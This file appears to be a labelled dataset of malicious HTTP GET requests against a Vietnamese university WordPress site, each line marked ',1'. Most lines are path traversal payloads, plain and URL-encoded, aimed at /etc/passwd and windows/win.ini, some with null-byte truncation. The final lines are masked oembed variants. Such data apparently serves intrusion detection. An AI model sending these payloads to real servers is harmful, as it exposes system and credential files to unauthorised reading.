GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00hop-tac/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/sach-xuat-ban..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00sach-xuat-ban/,1
GET/index.php/2018/01/16/hop-tac../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd%00hop-tac/,1
GET/index.php/2018/01/16/sach-xuat-ban../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd%00sach-xuat-ban/,1
GET/index.php/2018/03/06/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/18/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/06/ke-hoach-bao-ve-luan-van-cao-hoc-dot-21-4-2018..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/06/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00ke-hoach-bao-ve-luan-van-cao-hoc-dot-21-4-2018/,1
GET/index.php/2018/03/07/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/06/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/14/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/11/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/06/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/18/danh-sach-can-bo-duong-nhiem..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/11/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/16/xyz..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/18/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00danh-sach-can-bo-duong-nhiem/,1
GET/index.php/2018/03/06/ke-hoach-bao-ve-luan-van-cao-hoc-dot-21-4-2018../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/14/thong-bao-chuong-trinh-hoc-bong-postech-open-lab-2018..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/07/adecco-vietnam-tuyen-nhan-su..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00xyz/,1
GET/index.php/2018/01/18/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/06/chuong-trinh-hoc-chuyen-tiep-tai-dai-hoc-aizu-nhat-ban..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/11/cong-ty-co-phan-smartosc-tuyen-dung-fresher-php-va-net-2..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/11/cong-ty-luvina-tuyen-dung-50-fresher-thu-viec-5-thang-co-dao-tao-chuyen-sau-co-tra-luong..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/06/../../../../../../../../../../../../../../../../etc/passwd%00ke-hoach-bao-ve-luan-van-cao-hoc-dot-21-4-2018/,1
GET/index.php/2018/03/14/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00thong-bao-chuong-trinh-hoc-bong-postech-open-lab-2018/,1
GET/index.php/2018/03/07/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00adecco-vietnam-tuyen-nhan-su/,1
GET/index.php/2018/03/06/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00chuong-trinh-hoc-chuyen-tiep-tai-dai-hoc-aizu-nhat-ban/,1
GET/index.php/2018/03/11/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00cong-ty-co-phan-smartosc-tuyen-dung-fresher-php-va-net-2/,1
GET/index.php/2018/03/11/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00cong-ty-luvina-tuyen-dung-50-fresher-thu-viec-5-thang-co-dao-tao-chuyen-sau-co-tra-luong/,1
GET/index.php/2018/03/14/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/07/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/06/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/18/danh-sach-can-bo-duong-nhiem../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/11/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/11/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/16/xyz../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/18/../../../../../../../../../../../../../../../../etc/passwd%00danh-sach-can-bo-duong-nhiem/,1
GET/index.php/2018/03/16/../../../../../../../../../../../../../../../../etc/passwd%00xyz/,1
GET/index.php/2018/03/14/thong-bao-chuong-trinh-hoc-bong-postech-open-lab-2018../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/11/cong-ty-co-phan-smartosc-tuyen-dung-fresher-php-va-net-2../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/07/adecco-vietnam-tuyen-nhan-su../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/06/chuong-trinh-hoc-chuyen-tiep-tai-dai-hoc-aizu-nhat-ban../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/11/cong-ty-luvina-tuyen-dung-50-fresher-thu-viec-5-thang-co-dao-tao-chuyen-sau-co-tra-luong../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/07/../../../../../../../../../../../../../../../../etc/passwd%00adecco-vietnam-tuyen-nhan-su/,1
GET/index.php/2018/03/11/../../../../../../../../../../../../../../../../etc/passwd%00cong-ty-co-phan-smartosc-tuyen-dung-fresher-php-va-net-2/,1
GET/index.php/2018/03/06/../../../../../../../../../../../../../../../../etc/passwd%00chuong-trinh-hoc-chuyen-tiep-tai-dai-hoc-aizu-nhat-ban/,1
GET/index.php/2018/03/14/../../../../../../../../../../../../../../../../etc/passwd%00thong-bao-chuong-trinh-hoc-bong-postech-open-lab-2018/,1
GET/index.php/2018/03/11/../../../../../../../../../../../../../../../../etc/passwd%00cong-ty-luvina-tuyen-dung-50-fresher-thu-viec-5-thang-co-dao-tao-chuyen-sau-co-tra-luong/,1
GET/index.php/2018/03/20/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/20/stp-2018..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/hop-tac/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/03/20/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00stp-2018/,1
GET/index.php/2018/03/20/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/hop-tac/cac-chuong-trinh-trao-doi..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/hop-tac/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00cac-chuong-trinh-trao-doi/,1
GET/index.php/2018/03/20/stp-2018../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/hop-tac/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/03/20/../../../../../../../../../../../../../../../../etc/passwd%00stp-2018/,1
GET/index.php/category/hop-tac/cac-chuong-trinh-trao-doi../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/hop-tac/../../../../../../../../../../../../../../../../etc/passwd%00cac-chuong-trinh-trao-doi/,1
GET/index.php/category/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00thong-bao/,1
GET/index.php/category/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-bao/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-bao/tb-dao-tao..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/../../../../../../../../../../../../../../../../etc/passwd%00thong-bao/,1
GET/index.php/category/thong-bao/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tb-dao-tao/,1
GET/index.php/category/thong-bao/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-bao/tb-dao-tao../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-bao/../../../../../../../../../../../../../../../../etc/passwd%00tb-dao-tao/,1
GET/index.php/category/thong-bao/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-tin-chung/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao/tb-hoc-bong..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-tin-chung/quy-trinh..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao/tb-khac..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tb-hoc-bong/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-tin-chung/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00quy-trinh/,1
GET/index.php/category/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tin-tuc/,1
GET/index.php/category/tin-tuc/tt-nckh..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tb-khac/,1
GET/index.php/category/thong-bao/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-tin-chung/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tt-nckh/,1
GET/index.php/category/thong-bao/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/tt-doan-hoi..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/thong-bao/tb-nckh..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc/tt-dao-tao..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tt-doan-hoi/,1
GET/index.php/category/thong-bao/tb-hoc-bong../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-tin-chung/quy-trinh../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-bao/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tb-nckh/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tt-dao-tao/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-bao/tb-khac../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/../../../../../../../../../../../../../../../../etc/passwd%00tin-tuc/,1
GET/index.php/category/thong-bao/../../../../../../../../../../../../../../../../etc/passwd%00tb-hoc-bong/,1
GET/index.php/category/thong-tin-chung/../../../../../../../../../../../../../../../../etc/passwd%00quy-trinh/,1
GET/index.php/category/thong-bao/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/tt-nckh../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-bao/../../../../../../../../../../../../../../../../etc/passwd%00tb-khac/,1
GET/index.php/category/tin-tuc/tt-hop-tac..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd%00tt-nckh/,1
GET/index.php/category/tin-tuc/tt-doan-hoi../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tt-hop-tac/,1
GET/index.php/category/thong-bao/tb-nckh../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/tt-dao-tao../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd%00tt-doan-hoi/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/thong-bao/../../../../../../../../../../../../../../../../etc/passwd%00tb-nckh/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd%00tt-dao-tao/,1
GET/index.php/category/tin-tuc/tt-hop-tac../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd%00tt-hop-tac/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc/tt-tin-khac..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/category/tin-tuc/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tt-tin-khac/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/tt-tin-khac../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/category/tin-tuc/../../../../../../../../../../../../../../../../etc/passwd%00tt-tin-khac/,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>.<SV>&format=<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>.<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>.<SV>&format=<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>.<SV>%<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>&format=<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>.<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>&format=<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>.<SV>%<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>&format=<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>%<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>&format=<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>%<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>,1
GET/index.php/wp-json/oembed/1.0/embed?url=<SV>%<SV>%<SV>%<SV>.<SV>.<SV>.<SV>%<SV>&format=<SV>.<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>.<SV>%<SV>%<SV>.<SV>,1
